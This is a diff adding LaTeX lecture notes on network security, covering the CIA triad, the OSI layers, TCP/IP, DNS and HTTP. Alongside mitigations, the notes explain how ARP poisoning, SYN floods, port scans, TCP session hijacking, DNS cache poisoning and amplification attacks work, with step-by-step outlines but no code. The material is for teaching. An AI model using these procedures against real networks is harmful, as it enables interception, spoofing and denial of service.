@@ -1,0 +1,2584 @@
+\documentclass[a4paper, 10pt, titlepage]{article}
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amsthm}
+\usepackage{makecell}
+\usepackage[makeroom]{cancel}
+\usepackage{ulem}
+\usepackage{parcolumns}
+\usepackage{multicol}
+\setlength{\columnseprule}{0.4pt}
+\usepackage{lipsum}
+\usepackage{graphicx}
+\usepackage[dvipsnames]{xcolor}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage[T1]{fontenc}
+\usepackage[margin=3cm]{geometry}
+\usepackage{booktabs}
+\usepackage{fancyhdr}
+\usepackage{tikz}
+\usetikzlibrary{calc}
+\usepackage{listings}
+\lstset{
+	inputencoding=utf8,
+	basicstyle=\ttfamily,
+	tabsize=4,
+	showstringspaces=false,
+	literate={à}{{\`a}}1
+}
+\usepackage{fancyvrb}
+\pagestyle{fancy}
+\lhead{\nouppercase{\leftmark}}
+\rhead{\nouppercase{\rightmark}}
+
+\setcounter{topnumber}{8}
+\setcounter{bottomnumber}{8}
+\setcounter{totalnumber}{8}
+
+%TABLE OF CONTENTS
+\setcounter{tocdepth}{2}
+\usepackage{tocstyle}
+
+\begin{document}
+
+\title{Network Security}
+\author{Edoardo Righi}
+\maketitle
+\thispagestyle{empty}
+\tableofcontents
+\newpage
+
+\section{Security Properties}
+
+\begin{quote}
+The protection afforded to an automated information system in order to attain the applicable objectives of preserving the integrity, the availability and confidentiality of information systems resources.
+\begin{flushright}
+NIST Computer Security Handbook
+\end{flushright}
+\end{quote}	
+Computer security is about \textbf{preserving} security: you can only preserve something that you already have. Security technologies do not build security properties, they “merely” make sure that the security properties that are already there are maintained.\\
+There are 2 main concepts to understand:
+\begin{itemize}
+	\item What is it there to be preserved
+	\item What is the “built-in” security that need be preserved
+\end{itemize}
+Everything that operates and is operated by a computer is information: all a computer system is about is information.
+At the bare minimum, any “piece of information” is only useful if:
+\begin{itemize}
+	\item It can be reached
+	\item It can be read
+	\item It is correct
+\end{itemize}
+These can be seen as \textbf{“properties” of information}. Computer security is about preserving these properties:
+\begin{itemize}
+	\item Availability: Assure that a piece of information can be reached when needed
+	\item Confidentiality: Assure that a piece of info can be read only by those who are authorized to read it
+	\item Integrity: Prevent unauthorised modification of information (prevent unauthorised writing). While data integrity, integrity synonymous for external consistency.
+\end{itemize}
+This is known as the \textbf{CIA triad}. They are the “core”
+security properties of a piece of information. On top of this, one can build additional properties:
+\begin{itemize}
+	\item Accountability: the ability to know with certainty who/what operated on a piece of information
+	\item Non-repudiation: the entity that acted on the information cannot “repudiate” his/her/its action
+	\item Authentication: 
+		\begin{itemize}
+			\item User authentication: the ability to prove that a person is who she claims to be
+			\item Message authentication: assurance that the message has been sent by a party (IP address, server, computer, process, etc.)
+		\end{itemize}
+\end{itemize}
+The previously used terms for the actors on informations are who/what, entity, his/her/its. That is because humans are not the only “users” of information:
+\begin{itemize}
+	\item The human user of the system avertedly or un-avertedly
+	modifies information
+	\item The automated user can modify the information (Avertedly? Un-avertedly?)
+\end{itemize}
+\subsubsection*{Surrogates and delegation}
+A system/software/module/thread can act on the whole system (or another system) on behalf of a human user. “Delegation” is the mechanism by which, for example, software threads are spawned (e.g. with the privileges of the entity that spawned it). While a human user may or may not know what he/she does, a “surrogate” does not. There is no notion of “avertedly” or “un-avertedly”.
+
+\subsubsection*{Core problem of computer security}
+Computer systems do not know what they are doing. They can only execute instructions (i.e. information) to operate over some other information. Systems can only be instructed to protect the
+security properties of that information by means of some mechanism:
+\begin{itemize}
+	\item E.g. Confidentiality $\rightarrow$ crypto
+	\item E.g. Integrity $\rightarrow$ secure hardware
+	\item E.g. Availability $\rightarrow$ redundancy
+\end{itemize}
+
+\subsection{Trust in information security}
+What software/system can one trust? Imagine an authentication mechanism:
+\begin{itemize}
+	\item User inputs username;
+	\item User inputs password;
+	\item User presses enter;
+	\item User has access to Desktop.
+\end{itemize}
+The user trusts the authentication mechanism, but what happened really? Did the authentication SW do the actual match? Will it only grant access if it matches your credentials? Did it send your credentials to a third party? Did it use your credentials to read and copy your data (e.g. as stored in an encrypted volume)? \\
+Question: How do you increase your level of trust of the software? You look at the source code, but is this enough?
+What or who did really generate that software?
+\begin{itemize}
+	\item The human being that wrote the sw source code?
+	\item The compiler that compiled the sw source code?
+	\item The human being that wrote the compiler that compiles
+	the sw source code?
+	\item The compiler that compiled the compiler that compiled
+	the sw source code?
+	\item Etc..
+\end{itemize}
+The point is: \textbf{who do you trust?}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec1.png}
+\end{center}
+
+\subsection{Thompson’s view example}
+A compiler is written in C and is compiled by a previous version of itself. It takes one generation to add a “backdoor” that will automatically be included in the software compiled with the next compiler.
+
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec2.png}
+\end{center}
+
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec3.png}
+\end{center}
+The compiler can be modified in any way to include code that never appears in the SW source code. And depending on how many generations passed, it won’t appear in the previous compiler versions source code either.
+
+\begin{quote}
+You can't trust code that you did not totally create yourself (especially code from companies that employ people like me). No amount of source-level verification or scrutiny will protect you from using untrusted code.
+\begin{flushright}
+Thompson, Ken
+\end{flushright}
+\end{quote}
+
+\subsection{Computer Security vs Network Security}
+A computer network is a general architecture that allows computer systems to share information remotely. Network security is based on the same exact idea of preserving the CIA properties of information. \\
+Who can be trusted over the network? 
+Can you trust your own system?
+Can you trust the communication channel?
+Can you trust the destination system?
+
+\subsubsection{Possible attacker actions}
+A general attacker might:
+\begin{itemize}
+\item Infiltrate the communication in between hops: impersonate the client, modify connections/routing, etc.
+\item Be/infiltrate one of the hops: act “legally” until end of service (after which it may act maliciously).
+\end{itemize}
+How do you know if any of this happened?
+
+\subsection{Attack models in network setting: outright malicious attacker}
+Typically the malicious attacker aims at reading or modifying the messages (in part or fully). That’s a confidentiality, integrity, availability problem. In this contest, this attacker is typically called “man in the middle”, or “man in the browser”. Attacker can intercept and act upon a communication between client and server:
+\begin{itemize}
+\item Channel redirection
+\item Block communication entirely
+\item Spoofing the user’s identity
+\end{itemize}
+Example: injection of malicious content
+\begin{itemize}
+\item Manipulation of server response: client’s answer can also be modified by the attacker
+\item Connection Hijack: attacker injects him/herself in the communication and spoofs the victim’s identity
+\end{itemize}
+
+\subsection{Attack models in network setting: honest-but-curious attacker}
+The goal of this attacker is to use the client’s information after correctly handling the service. Typically resides at the service level (e.g. ISP) and typically implies confidentiality and possibly integrity threats.\\
+Example: DB Server is the attacker. Provides agreed service correctly (e.g. answers queries with correct data). After the query is delivered to the client, the server uses the query’s information to perform user profiling.
+
+\newpage
+\section{Network aspects}
+Internet is made of several logically separated networks: the \textbf{Autonomous Systems} (\textbf{AS}). Each AS autonomously manages communications within itself:
+\begin{itemize}
+\item Interior Gateway Protocols (IGP): route within each AS. 
+\item E.g. two commonly used IGPs are them Routing Information Protocol (RIP) and the Open Shortest Path)First (OSPF) protocol.
+\end{itemize}
+Each AS can communicate to other AS: the Exterior Gateways Protocols are the route between ASs (Border Gateway Protocol).
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec4.png}
+\end{center}
+
+\subsection*{OSI model}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec5.png}
+\end{center}
+
+\subsection{Data link layer}
+It is the lowest “logical” level, where data link interconnects physical interfaces. Each physical interface is identified by a MAC address:
+\begin{itemize}
+\item “Ethernet address”
+\item 48-bit Network interface identifiers
+\item Closest representation of final destination of a frame
+\item HEX notation: HH-HH-HH-HH-HH-HH
+\item Used to route packets in local networks
+\end{itemize}
+MAC addresses uniquely identify a network interface and are assigned by the producer according to the system command to list net interfaces standard IEEE 802. The first 24 bit are set by IEEE standard and identify the network interface producer.
+
+\subsection{Network layer}
+Provides information on how to reach other systems (addressing functionalities). The IP operates at this layer: it is an high-level representation of a host’s addresses and conveys information to route the datagram. IPv4 was defined in RFC 791. Most IP addresses are dynamically assigned by an authority (e.g. ISP’s DHCP server), as opposed to MAC addresses that are fixed by the vendor. It is a “connectionless” protocol (stateless): there is no notion of “established connection” at this stage, it only provides the means necessary for a packet to reach its destination.
+
+\subsubsection*{Stateless vs Stateful}
+A communication is made of a number of messagges. Communications start, develop, and ends. Stateful protocols provide means to establish and close a connection (e.g. TCP). Stateless protocols do not have this notion (IP messages are stand-alone packets).
+
+\subsubsection*{IP addresses}
+IP provides a structured way to abstract host addresses away from their physical properties. There exists two versions:
+\begin{itemize}
+\item IPv4: most common, currently used (32 bits)
+\item IPv6: early adoption, will be seen commonly in the future (128 bits)
+\end{itemize}
+Makes it possible to efficiently talk between systems in different AS.
+
+\subsubsection*{ARP protocol}
+The ARP (Address Resolution Protocol) allows systems to associate an IP address to a MAC address. It allows discovery through broadcast. ARP tables contain information to translate IP addresses into MAC addresses.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec6.png}
+\end{center}
+ARP tables A $\rightarrow$ B:
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec6b.png}
+\end{center}
+ARP tables A $\rightarrow$ C:
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec6c.png}
+\end{center}
+ARP tables A $\rightarrow$ D:
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec6d.png}
+\end{center}
+
+\subsubsection*{ARP query}
+All addresses in an ARP table are added by one of two mechanisms.
+\begin{itemize}
+\item ARP request-reply:
+\begin{itemize}
+\item who is 192.168.0.16 tells 192.168.0.1
+\item 192.168.0.16 is at 00-10-BC-2c-11-56
+\end{itemize}
+\item Gratuitous ARP
+\begin{itemize}
+\item 192.168.0.16 is at 00-10-BC-2c-11-56
+\end{itemize}
+\end{itemize}
+The discovery process happens through queries to neighbor devices: broadcast message to the desired IP (e.g. L2 ethernet address FF-FF-FF-FF-FF-FF). The system with the requested IP replies back with its correct mac address. \medskip\\
+ARP tables A $\rightarrow$ D:
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec6e.png}
+\end{center}
+
+\subsubsection{ARP poisoning}
+ARP answers or Gratuitous ARP frames do not require an (additional) answer/confirmation: it’s a declarative protocol. Nodes are not authenticated, whomever can say I am x.x1.x2.x3, my mac address is hh.hh1.hh2.hh3.hh4.hh5.\\
+C can tell to B “D is at [C mac address]” and to D “B is at [C mac address]”. As a result every communication between B and D will pass by C.
+\subsubsection*{ARP poisoning - limitations}
+It works only on local networks, where MAC addresses are actually meaningful. When communication is targeted to different network, IP addresses are used. Routers and DNSs have MAC addresses too. The poisoning works because systems are not authenticated; some implementations/third party tools can mitigate the problem (check for anomalies).
+
+\subsubsection*{IP header}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec7.png}
+\end{center}
+
+\subsubsection*{Subnets and CIDR}
+Subnets are logical divisions of IP addresses that make possible to split a network in multiple sub-networks. IP bits are divided in x network bits, y subnet bits and z host bits. Subnet mask indicates sections of IP addresses meant for network+subnet. 255.255.255.0 allocates 24 bits to network+subnet, 8 bits to hosts. \\
+CIDR is a synthetic way to represent subnet masks, using classless Inter-Domain Routing. It indicates the number of bits covered by the mask:
+ $$192.168.10.1/24 = 192.168.10.1/255.255.255.0$$
+ 
+\subsubsection*{IP Fragments}
+\begin{itemize}
+\item Identification, 16 bit: unique identifier of the fragmented
+datagrams. All fragments have the same identification number.
+\item Flags, 3 bit
+\begin{itemize}
+\item 0: Reserved, must be 0
+\item DF: Don’t fragment (0 = there may be fragments, 1 = don’t fragment. If must be fragmented, drop datagram).
+\item MF: More fragments (0 = last fragment, 1 = there are more fragments.
+\end{itemize}
+\item Offset, 13 bits: offset of this datagram w.r.t first fragment
+with that ID.
+ \end{itemize}
+ 
+ 
+\subsubsection{Denial of service with IP fragments}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec8.png}
+\end{center}
+
+\subsubsection*{Internet Control Message Protocol}
+It was defined in RFC 792 and relies on IP. However, it is an integral part of the Internet Protocol. All IP modules must have ICMP support.
+
+\subsubsection{Denial of Service}
+Denial of service (DoS) is a type of attack that aims at congesting or overpowering a system’s capacity by generating requests the system will have to answer. It can affect the performance of the attacked system or its channels and lead to a system crash due to resource consumption. DoS can be operated locally or over the network.
+
+\subsubsection*{A simple DoS (Ping Flood)}
+Network DoS attacks usually exploit protocol features.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec9.png}
+\end{center}
+A can exploit its wider bandwidth to flood B with ICMP echo requests. B’s bandwidth gets (quickly, relatively to A’s) exhausted with A’s requests and B’s replies; B can no longer operate on its network channel.
+
+\subsubsection*{A more advanced DoS (Ping of Death)}
+ICMP packets are typically 64 bytes in size including IP headers and data IP datagram can extend up to 65,535 bytes. Data Length field is 16 bit. Early implementations of Internet modules were strictly implementing RFC
+directives, so not handling exceptions properly. The idea behind the Ping of Death is to generate large ICMP packet, and fragment them in 1024 IP packets of 64 Bytes. The destination receives regular packet, IP module compose fragments and ICMP module tries to read datagram bigger than assigned buffer size. The destination crashes because of “buffer overflow” (possible execution of code in memory).
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec10.png}
+\end{center}
+
+\subsection{OSI TRANSPORT LAYER}
+There are 2 protocols: TCP and UDP.
+\subsubsection{Transmission Control Protocol (TCP)}
+IP can only be used to send datagrams, ”chunks” or “streams” of information, from sender IP to destination IP. TCP builds on top of IP the notion of “state”: systems that communicate using the TCP protocol engage in a stateful communication.
+So, while IP delivers the data, TCP manages the data segments using checksums, re-delivery of unreceived packets and re-delivery of corrupt packets.
+
+\subsubsection*{TCP/IP header}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec11.png}
+\end{center}
+TCP is based on IP. Server and client that participate in a TCP connection open a ”socket”:
+\begin{itemize}
+\item SOURCEIP:SOURCEPORT
+\item DESTIP:DESTPORT
+\end{itemize}
+A connection between a client and a server is identified by the tuple
+\begin{lstlisting}
+	<SOURCEIP:SOURCEPORT, DESTIP:DESTPORT >
+\end{lstlisting}
+All TCP packets are directed toward a port. The common dest ports are port 22 (SSH), port 80 (HTTP), port 443 (HTTPS) and port 21 (FTP). Client usually generates source port randomly.
+\begin{itemize}
+\item LISTEN: service listening on port (open)
+\item CLOSE: no service listening on port (closed)
+\end{itemize}
+Some flags in the header are:
+\begin{itemize}
+\item SYN: initialize the TCP session, should be set to 1 only for first
+datagram by client and server;
+\item ACK: acknowledge the reception of the segment (associated with an ACK number)
+\item FIN: signals intention to close the connection (end of data)
+\item RST: connection is dropped (reset)
+\end{itemize}
+Other fields:
+\begin{itemize}
+\item Sequence number: 32 bit number generated by each end
+	\begin{itemize}
+	\item communication start (SYN=1): \lstinline|Client_seq = J / Server_seq = K|
+	\item during communciation: SEQN = “this is packet x”
+	\end{itemize}
+\item Acknowledgement number (32 bits) ACKN = “expecting x+1”
+\end{itemize}
+
+\subsubsection*{TCP 3-way handshake (SYN)}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec12.png}
+\end{center}
+
+\subsubsection*{TCP 4-way handshake (FIN)}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec12b.png}
+\end{center}
+
+\subsubsection*{Keeping track of TCP connections}
+The server receives a SYN request (\lstinline|SYN_RCVD|), so it must keep track of this in order to establish a connection. Once it is ESTABLISHED, both ends set up a “Transmission Control Block” (TCB) to keep track of connection, which is a special data structure that stores information about connection (sockets, seq. numbers, pointers to buffer in memory). Then they allocate memory buffer to store data that will arrive. The TCB structure is freed from memory when connection reaches status CLOSED.\medskip \\
+A packet with RST flag up does not receive an answer:
+\begin{itemize}
+\item CLOSED state: ANY packet with no RST receives a RST;
+\item LISTEN state: A packet with SYN flag up and no ACK opens a TCP
+session. Answer is SYN+ACK. A packet with only ACK receives a RST. Drop with no answer otherwise.
+\end{itemize}
+An unsolicited SYN+ACK gets a RST regardless of listening state.
+
+\subsubsection{SYN Denial of service attack}
+When the server receives SYN J, it answers back with SYN K, ACK J+1. The server opens new session in a separate thread, so it allocates resources (Transmission Control Block allocation). Server then waits for ACK K+1 from client. The RST will be sent back after the amount of time set by the Maximum Segment Lifetime (MSL), which is set by default to 2 minutes. The same mechanism is used sender side: the attacker controls the system, so it may bypass it.
+
+\subsubsection*{SYN Flood DoS, naïve solution}
+Server typically has more bandwidth available than single client. Client can drop all SYN ACKs (e.g. with a firewall) to not exhaust its own memory, but throughput necessarily slows down by O(2N): for each SYN, you get a SYN ACK, so the bandwidth quickly decays. Server’s memory must be exhausted before the throughput becomes insufficient.
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec13.png}
+\end{center}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec14.png}
+\end{center}
+
+\subsubsection*{Denial of service limitations}
+In theory this attack should not work. Why? B should receive a RST by each zombie, which would free TCB and avoid DoS. An attacker can choose destination IPs that do not reply and firewalls may simply drop the packet with no RST. Some IPs may actually not be in use: in theory this will generate an ICMP packet (host not reachable) and close the connection (RFC 1122: A Destination Unreachable message that is received MUST be reported to the transport layer).
+SYN packets must arrive at very high rates. Other more sophisticated techniques exist:
+\begin{itemize}
+\item Distributed Denial of Service (nowadays more common)
+\item Coremelt DoS
+\end{itemize}
+
+\subsubsection*{DoS Mitigation (pointers)}
+\begin{itemize}
+\item Load balancing: distribute traffic loads evenly
+\item Rate limiter: deny traffic above a certain rate of SYN/sec
+\item Proof of work: require source to solve a crypto puzzle before allocating resources to connection (however it requires protocol support)
+\end{itemize}
+
+\subsubsection*{Network scans}
+It’s possible to exploit specifications of a network protocol (TCP, UDP,..) to learn something about a system or a network. For example build a list of services running on a remote system, infer a network’s structure, build a list of zombie IPs that do not send RST back. 
+There exists several types of scans and several popular tools to do one, like nmap.
+
+\subsubsection*{SYN Scan}
+Attacker forges TCP packets (SYN=1). It is useful to measure whether remote system accepts incoming connections on port=x. Typically this corresponds to a specific service:
+\begin{itemize}
+\item SYN ACK from port 22: SSH is likely listening
+\item SYN ACK from port 80: HTTP server is likely listening
+\item RST: port x is closed on remote system
+\end{itemize}
+In a \textbf{half-open SYN scan}, after server’s SYN ACK reply, the attacker sends RST and the 3-way handshake is never finished (example in the image).
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec15.png}
+\end{center}
+
+\subsubsection*{Host fingerprinting}
+RFC 793 is the reference document for TCP stack implementation. However, not all specifications are always implemented as stated: different operating systems have their own
+independent implementation. It’s possible to infer which operating system is on the other side on the basis of the received answers. This technique is called fingerprinting.
+An example of scan that allows for some level of fingerprinting is the \textbf{FIN/Xmas/Null scan}.
+\begin{itemize}
+	\item FIN $\rightarrow$ flag FIN = 1
+	\item Null $\rightarrow$ all flags = 0
+	\item Xmas $\rightarrow$ FIN, URG, PSH = 1
+\end{itemize}
+From RFC:
+\begin{itemize}
+	\item Port is OPEN $\rightarrow$ DROP, no answer
+	\item Port is CLOSED $\rightarrow$ DROP, RST
+\end{itemize}
+For example, Windows XP and HP/UX always reply with RST. Different hosts, different answers.
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec16.png}
+\end{center}
+
+\subsubsection{TCP Session Hijacking}
+The goal is to to send commands to a server the attacker does not have access to: client is authorized (e.g. simple IP address authentication), the server must think that the attacker is the client but the attacker does not sit in between client and server. \medskip\\
+
+\begin{minipage}{0.55\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.3]{img/netsec17a.png}
+	\end{center}
+\end{minipage}
+\hfill
+\begin{minipage}{0.35\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.3]{img/netsec17b.png}
+	\end{center}
+\end{minipage} \medskip\\
+How can the circumvent this? By pretending he is the client! A TCP segment between a client and a server is identified and validated by:
+\begin{itemize}
+	\item Client IP: known (public)
+	\item Destination IP: known (public)
+	\item Port: known (public – if not standard, scan)
+	\item Client SEQ number: known (attacker generates it)
+	\item Server SEQ number: unknown (randomly generated by server and sent to \lstinline|$CLIENT_IP|)
+\end{itemize}
+So it may be possible to predict the SEQ number. From RFC 793:
+\begin{quote}
+	When new connections are created, an initial sequence 	number (ISN) generator is employed which selects a new 32 	bit ISN. The generator is bound to a (possibly fictitious) 32 bit clock whose low order bit is incremented roughly every 4 microseconds.
+\end{quote}
+The \textbf{original BSD Unix} implementation was to increment by n units/second, and by n/2 units per new TCP connection. \textbf{Nowadays} implementations are (closer to) a random number generator.
+
+\subsubsection{Mitnick attack}
+In order to impersonate the client, the attacker only needs to correctly guess the server’s SEQ number ($1/2^{32}$ chances of getting it right). This is assuming perfect implementation of server’s random number generator, in reality this may be much simpler (“TCP Sequence prediction”). \medskip\\
+The problem:
+\begin{center}
+	\includegraphics[scale=0.2]{img/netsec17c.png}
+\end{center}
+The solution:
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec17d.png}
+\end{center}
+
+\subsubsection{User Datagram Protocol (UDP)}
+Differently from TCP, UDP is a stateless protocol. It is faster to deliver data, while data integrity can be controlled at application level. It relies on reliability of underlying network link and does not guarantee delivery (no acknowledgment mechanism). UDP is used by some of the most important infrastructures of the Internet:
+\begin{itemize}
+	\item DNS servers: to resolve internet domains
+	\item NFS (Network File System): distributed FS
+	\item SNMP (Simple Network Management Protocol): management of IP devices on a network
+	\item DHCP (Dynamic Host Configuration Protocol): assign IP addresses to network devices
+	\item Most real-time applications (real-time transactions, DBs, etc..)
+\end{itemize}
+UDP scans are interesting as many core services are running over UDP and listening to UDP ports. It can be used to discover (likely) open ports on the network:
+\begin{itemize}
+	\item CLOSED = ICMP port unreachable
+	\item OPEN = no answer
+\end{itemize}
+These scans are however prone to errors: ICMP packet can be filtered or dropped (firewalls/routers) and it is possible to configure a ”stealth” system that does not reply to UDP requests to CLOSED ports.
+
+%TLS non trattato, salta diretto a APPL. LAYER perchè tanto TLS lo abbiamo già fatto altrove
+
+\subsection{OSI SESSION / PRESENTATION / APPLICATION LAYER}
+On top of IP, TCP, UDP, etc. there are a plethora of application-level protocols:
+\begin{itemize}
+	\item FTP: file transfer
+	\item SMTP/POP/IMAP: mail
+	\item Telnet: remote access
+	\item SSH: remote access
+	\item HTTP: web
+	\item DNS: infrastructure
+	\item SSL/TLS: secure web
+\end{itemize}
+Pointless exercise to go through them all. Rather, we focus on some most important threats.
+
+\subsubsection{Domain Name Service}
+DNS is a hierarchical system for domain name resolving. It translates human-readable addressed (google.com) to (a set of) IP addresses the domain is reachable at. UDP is used for fast answers (port 53). Each transaction identified by an ID (16 bits), the Query ID (“QID”). In the original DNS implementation there was an incremental QID. There are Several types of records. Of interest here:
+\begin{itemize}
+	\item A (AAAA) $\rightarrow$ IPv4 (IPv6) of the requested domain (e.g. a.website.com A 65.61.198.201)
+	\item NS $\rightarrow$ IP of the DNS server to ask (e.g. a.website.com NS ns.website.com), followed by an A answer for the DNS (ns.website.com A 2.2.2.2)
+\end{itemize}
+
+\subsubsection*{DNS hierarchy}
+\textbf{Root} DNSs are responsible for top level domain queries (e.g. .com NS ns.auth.net), \textbf{Authoritative} DNSs answer queries whose answer it already knows (does not ask to other DNSs) and \textbf{Recursive} DNSs forward queries to Authoritative DNSs. There are 13 root DNSs in the world.
+
+\subsubsection*{Name resolution}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec19.png}
+\end{center}
+
+\subsubsection*{Queries}
+\begin{itemize}
+	\item \textbf{recursive query}: DNS client requires DNS server respond with either the requested resource 	record, or an error message stating that the record or domain name does not exist.
+	\item \textbf{iterative query}: contacted server replies with name of server to contact “I don’t know this 	name, but ask this server XXX”
+\end{itemize}
+
+\subsubsection*{Cache \& Time-to-live}
+Simplified description left out an important aspect. For reasons of performance optimisation: when name server receives an answer, it stores the answer in its cache. When receiving a request, name server first checks whether answer is already in its cache; if this is the case, the cached answer is given.
+The answer remains in cache until it expires, so the use of cache can be extensive; the time-to-live (TTL) of the answer is set by sender.
+Why is that? The server knows how often the website it is referring to usually changes. %reasons for setting TTL by receiver = ???
+The security does not depend on the TTL: it all depends if the cached data is correct.
+
+\subsubsection*{Light-weight Authentication}
+Anybody can pretend to be an authoritative name server for any zone. How does a recursive name server know that it has received a reply from an authoritative name server? Recursive name server includes a 16-bit query ID (QID) in its requests. Responding name server copies QID into its answer; applies it also to answer from authoritative name server. Recursive name server caches first answer for a given QID and host name; then discards this QID. Instead they drop answers that do not match an active QID. \medskip\\
+If routing to and from root servers and TLD servers cannot be compromised, the attacker can only try to improve her chances of guessing a query ID. Some (earlier) versions of BIND used a counter to generate the QID.
+
+\subsubsection{Cache poisoning attack}
+\begin{enumerate}
+	\item Ask recursive name server to resolve host name in attacker’s 	domain.
+	\item Request to attacker’s name server contains current QID.
+	\item Ask recursive name server to resolve host name you want to take over; send answer that includes next QID and maps host name to your chosen IP address.
+	\item If your answer arrives before the authoritative answer, your value 	will be cached; the correct answer is dropped.
+\end{enumerate}
+\begin{minipage}{0.25\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.3]{img/netsec20.png}
+	\end{center}
+\end{minipage}
+\hfill
+\begin{minipage}{0.75\textwidth}
+	\begin{center}
+		\includegraphics[scale=0.3]{img/netsec21.png}
+	\end{center}
+\end{minipage} \medskip\\
+If you want to perform authentication without cryptography, \textbf{do not use predictable challenges}. More ways of improving the attack’s chances:
+\begin{itemize}
+	\item To account for other queries to the recursive name server concurrent to the attack, send answers with QIDs from a small window.
+	\item To increase the chance that fake answer arrives before authoritative answer, slow down authoritative name server with a DoS attack.
+	\item To prevent that a new query for the host name restores the correct binding, set a long time to live.
+\end{itemize}
+
+\subsubsection{DNS cache poisoning}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec22a.png}
+\end{center}
+\begin{center}
+	\includegraphics[scale=0.3]{img/netsec22b.png}
+\end{center}
+
+\subsubsection*{DNS full picture}
+\begin{center}
+	\includegraphics[scale=0.28]{img/netsec22c.png}
+\end{center}
+
+\subsubsection{Kaminsky vulnerability}
+The Kaminsky vulnerability can lead to a cache poisoning attack. The attacker rather than replacing an A record replaces an NS record: this way the attacker can get control over any
+(sub)domain.
+\begin{center}
+	\includegraphics[scale=0.28]{img/netsec22d.png}
+\end{center}
+\begin{center}
+	\includegraphics[scale=0.28]{img/netsec22e.png}
+\end{center}
+
+\subsubsection*{Mitigation}
+Source of attack is low entropy with a 16 bit ID, the randomness is not enough to represent a significant margin. Moving ID size to 32 bits is not feasible, and it is not possible to change the protocol. The solution is to randomize the source port (16 bits) to increase entropy (in reality it is not possible to use all 16 bits for the source port because of reserved values). Any answer that does not match both source port and transaction ID will be dropped.
+
+\subsubsection{DNS amplification attack}
+It is a type of DoS attack which exploits certain type of DNS answers that are much bigger in size than the requests. The  attack’s throughput is much bigger than attacker’s input. DNS works over UDP, so the source IP is easy to spoof.
+\begin{center}
+	\includegraphics[scale=0.28]{img/netsec22f.png}
+\end{center}
+
+\subsubsection{DNS zone transfer}
+A zone is a domain for which a server is authoritative. “slave” servers can ask “authoritative” servers to copy their zone database (over TCP). An attacker pretends to be a slave server and dump the zone DB: it acquires knowledge of zone’s infrastructure and can be used to facilitate further attacks (e.g. spoofing or more direct attacks).
+
+\subsubsection{DNSSec}
+It is the secure implementation of the DNS protocol. Implements DNS authentication on top of normal DNS exchange: digitally signed over a chain-of-trust starting from the root server, uses electronic certificates (Public-key crypto to authenticate by showing proof that you own a secret key). Protects data integrity (no confidentiality protection).
+
+\subsubsection{HTTP}
+\label{http}
+Main protocol on which the www works. Based on the notion that client can either request or submit data to a server. There are two methods: GET (requests data from a specified resource) and POST (submits data to be processed to a specified resource). HTTP is stateless; statefulness is enabled with the use of cookies.
+
+\subsubsection*{URLs}
+Global identifiers of network-retrievable documents. Special characters are encoded as hex (e.g., \lstinline|%0A| = newline, \lstinline|%20| = space, \lstinline|%2B| = +).
+
+\subsubsection*{GET request}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec23a.png}
+\end{center}
+
+\subsubsection*{POST request}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec23b.png}
+\end{center}
+
+\subsubsection*{HTTP response}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec23c.png}
+\end{center}
+
+\subsubsection*{Cookies}
+They are used to store state on user’s machine, also for authentication.
+
+\subsubsection{HTTP session hijacking}
+Session ID is used by the webserver to authenticate client “victim”. If the cookie is sent over in-the-clear, the attacker can read the session ID cookie and spoof the victim’s identity (e.g. access to personal webpages/accounts). \medskip\\
+The use of secure cookies provides confidentiality against network attacker (browser will only send cookie back over encrypted channels) but no integrity (still possible to rewrite secure cookies over HTTP).
+
+\subsubsection{Telnet}
+Protocol used in remote control services. It is implemented through a virtual terminal that connects to systems. Operates over TCP port 23. Remote client can issue commands to server: plain-text commands, typically without authentication or channel encryption. No need to go through possible attacks here, just use SSH instead.
+
+\subsubsection{Common issues}
+Most of the network attacks seen so far have at least one of two issues common among most network problems:
+\begin{itemize}
+	\item Lack of authentication: the real sender/receiver of a packet/datagram cannot be authenticated (it is possible to spoof its identity);
+	\item Communication channel is in the clear: a clever or well-positioned (in the network) attacker can read and 	potentially modify the information exchanged over the 	channel.
+\end{itemize}
+
+\newpage
+\section{Security Protocols}
+The typical attacks to IPv4 are:
+\begin{itemize}
+	\item Lack of confidentiality (stealing credentials)
+	\item Lack of source authentication (spoofing, DOS)
+	\item Source routing (spoofing and redirection)
+\end{itemize}
+
+\subsubsection*{Example of security protocols}
+\begin{center}
+	\includegraphics[scale=0.25]{img/netsec24.png}
+\end{center}
+Having an ID number to open the car is not safe because the message can just be copied and sent again; with the use of cryptography the problem does not change (can still just send again the message).
+With the nonces solution the Replay attack is avoided, however there still exists the possibility of doing a MITM attack.
+
+\subsubsection*{“Secure Channels”}
+Protections is achieved by building a “secure channel” between two end points on an insecure network, typically offering:
+\begin{itemize}
+	\item \textbf{Data origin authentication};
+	\item \textbf{Data integrity};
+	\item \textbf{Confidentiality}.
+\end{itemize}
